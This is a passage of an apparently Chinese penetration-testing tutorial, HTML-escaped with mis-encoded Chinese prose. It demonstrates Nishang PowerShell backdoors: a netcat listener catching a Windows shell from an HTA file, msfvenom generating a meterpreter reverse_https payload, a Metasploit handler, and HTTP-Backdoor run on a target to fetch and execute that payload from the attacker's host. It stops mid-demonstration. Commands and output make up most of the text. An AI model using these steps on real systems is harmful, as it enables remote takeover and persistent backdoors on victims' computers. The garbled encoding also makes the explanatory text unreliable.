&lt;span class=&#34;n&#34;&gt;-HTAFilePath&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;./&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;hta&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;HTA&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;written&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;./&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;hta&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å†è¿è¡Œä¸€ä¸‹&lt;code&gt;1.hta&lt;/code&gt;æ–‡ä»¶å³å¯çœ‹åˆ°ä¸»æœºå·²ç»ä¸Šçº¿ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”€â”€&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kaliã‰¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€$ nc -lnvp &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt;                                                                                                                                                                                             
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;listening on &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;any&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt; ...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;connect to &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;172.16.0.107&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; from &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;172.16.0.110&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;51298&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;whoami
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;desktop-win10&lt;span class=&#34;se&#34;&gt;\w&lt;/span&gt;in10
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\w&lt;/span&gt;in10&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;åé—¨-1&#34;&gt;åé—¨&lt;/h3&gt;
&lt;p&gt;æˆ‘ä»¬å¯ä»¥åœ¨ç›®å½•&lt;code&gt;Backdoors&lt;/code&gt;ä¸‹çœ‹åˆ°å„ç§ç”Ÿæˆåé—¨çš„è„šæœ¬ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Backdoors&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ls
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Mode&lt;/span&gt;                &lt;span class=&#34;n&#34;&gt;LastWriteTime&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;Length&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Name&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;----&lt;/span&gt;                &lt;span class=&#34;p&#34;&gt;-------------&lt;/span&gt;         &lt;span class=&#34;p&#34;&gt;------&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;----&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;------&lt;/span&gt;        &lt;span class=&#34;mf&#34;&gt;2021&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;23&lt;/span&gt;     &lt;span class=&#34;mf&#34;&gt;22&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;49&lt;/span&gt;           &lt;span class=&#34;mf&#34;&gt;5049&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Add-ConstrainedDelegationBackdoor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;//&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;------&lt;/span&gt;        &lt;span class=&#34;mf&#34;&gt;2021&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;23&lt;/span&gt;     &lt;span class=&#34;mf&#34;&gt;22&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;49&lt;/span&gt;           &lt;span class=&#34;mf&#34;&gt;1741&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Add-RegBackdoor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;------&lt;/span&gt;        &lt;span class=&#34;mf&#34;&gt;2021&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;23&lt;/span&gt;     &lt;span class=&#34;mf&#34;&gt;22&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;49&lt;/span&gt;           &lt;span class=&#34;mf&#34;&gt;5077&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Add-ScrnSaveBackdoor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;------&lt;/span&gt;        &lt;span class=&#34;mf&#34;&gt;2021&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;23&lt;/span&gt;     &lt;span class=&#34;mf&#34;&gt;22&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;49&lt;/span&gt;          &lt;span class=&#34;mf&#34;&gt;18593&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;DNS_TXT_Pwnage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;------&lt;/span&gt;        &lt;span class=&#34;mf&#34;&gt;2021&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;23&lt;/span&gt;     &lt;span class=&#34;mf&#34;&gt;22&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;49&lt;/span&gt;          &lt;span class=&#34;mf&#34;&gt;12739&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Execute-OnTime&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;------&lt;/span&gt;        &lt;span class=&#34;mf&#34;&gt;2021&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;23&lt;/span&gt;     &lt;span class=&#34;mf&#34;&gt;22&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;49&lt;/span&gt;           &lt;span class=&#34;mf&#34;&gt;6122&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Gupt-Backdoor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;------&lt;/span&gt;        &lt;span class=&#34;mf&#34;&gt;2021&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;23&lt;/span&gt;     &lt;span class=&#34;mf&#34;&gt;22&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;49&lt;/span&gt;          &lt;span class=&#34;mf&#34;&gt;13572&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;HTTP-Backdoor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;------&lt;/span&gt;        &lt;span class=&#34;mf&#34;&gt;2021&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;23&lt;/span&gt;     &lt;span class=&#34;mf&#34;&gt;22&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;49&lt;/span&gt;           &lt;span class=&#34;mf&#34;&gt;4385&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Invoke-ADSBackdoor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;------&lt;/span&gt;        &lt;span class=&#34;mf&#34;&gt;2021&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;23&lt;/span&gt;     &lt;span class=&#34;mf&#34;&gt;22&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;49&lt;/span&gt;           &lt;span class=&#34;mf&#34;&gt;5597&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Set-RemotePSRemoting&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;------&lt;/span&gt;        &lt;span class=&#34;mf&#34;&gt;2021&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;23&lt;/span&gt;     &lt;span class=&#34;mf&#34;&gt;22&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;49&lt;/span&gt;           &lt;span class=&#34;mf&#34;&gt;8017&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Set-RemoteWMI&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™é‡Œæ¼”ç¤ºä¸‰ä¸ªåé—¨ï¼Œä¸€ä¸ªæ˜¯&lt;code&gt;HTTP-Backdoor&lt;/code&gt;å’Œ&lt;code&gt;Add-ScrnSaveBackdoor&lt;/code&gt;ã€&lt;code&gt;Invoke-ADSBackdoor&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;é¦–å…ˆåœ¨msfç”Ÿæˆä¸€ä¸ªpowershellçš„åé—¨ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”Œâ”€â”€&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kaliã‰¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€$ msfvenom -p windows/x64/meterpreter/reverse_https &lt;span class=&#34;nv&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;172.16.0.107 &lt;span class=&#34;nv&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt; -f psh -o test.ps1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; No platform was selected, choosing Msf::Module::Platform::Windows from the payload
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; No arch selected, selecting arch: x64 from the payload
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;No encoder specified, outputting raw payload
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Payload size: &lt;span class=&#34;m&#34;&gt;746&lt;/span&gt; bytes
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Final size of psh file: &lt;span class=&#34;m&#34;&gt;4405&lt;/span&gt; bytes
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Saved as: test.ps1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åœ¨msfé‡Œé¢æ‰§è¡Œç›‘å¬ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; payload windows/x64/meterpreter/reverse_https
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; windows/x64/meterpreter/reverse_https
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; show options
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Module options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;exploit/multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Name  Current Setting  Required  Description
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   ----  ---------------  --------  -----------
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Payload options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;windows/x64/meterpreter/reverse_tcp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Name      Current Setting  Required  Description
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   ----      ---------------  --------  -----------
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   EXITFUNC  process          yes       Exit technique &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Accepted: &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;, seh, thread, process, none&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   LHOST     172.16.0.107     yes       The listen address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;an interface may be specified&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   LPORT     &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt;             yes       The listen port
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Exploit target:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Id  Name
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   --  ----
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;   Wildcard Target
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; run
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started HTTPS reverse handler on https://172.16.0.107:4444
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æœ€ååœ¨test.ps1ç›®å½•ä¸­è¿è¡ŒhttpæœåŠ¡å™¨ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python -m http.server
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™æ ·å°±éƒ¨ç½²æˆåŠŸåŸºç¡€ç¯å¢ƒäº†ã€‚&lt;/p&gt;
&lt;p&gt;1ã€HTTP-Backdoor&lt;/p&gt;
&lt;p&gt;åœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PS C:\Users\test\Desktop\nishang-master\nishang-master\Backdoors&amp;gt; Import-Module .\HTTP-Backdoor.ps1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PS C:\Users\test\Desktop\nishang-master\nishang-master\Backdoors&amp;gt; HTTP-Backdoor
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ä½äºå‘½ä»¤ç®¡é“ä½ç½® 1 çš„ cmdlet HTTP-Backdoor
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;è¯·ä¸ºä»¥ä¸‹å‚æ•°æä¾›å€¼:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;CheckURL: http://172.16.0.107:8000/user.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PayloadURL: http://172.16.0.107:8000/test.ps1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;MagicString: start123
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;StopString: stop123
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ„æ€å°±æ˜¯è¯´æä¾›ä¸€ä¸ªcheckURLï¼Œç„¶åä¸æ–­æ£€æµ‹è¿™ä¸ªurlçš„å†…å®¹ï¼Œå¦‚æœå‡ºç°start123é‚£å°±å¼€å§‹æ‰§è¡Œè¿œç¨‹payloadURLçš„æ–‡ä»¶ï¼Œå¦‚æœæ£€æµ‹åˆ°stop123å†…å®¹å°±åœæ­¢æ‰§è¡Œã€‚&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°kaliå·²ç»åå¼¹å›æ¥ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; run
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started HTTPS reverse handler on https://172.16.0.107:4444
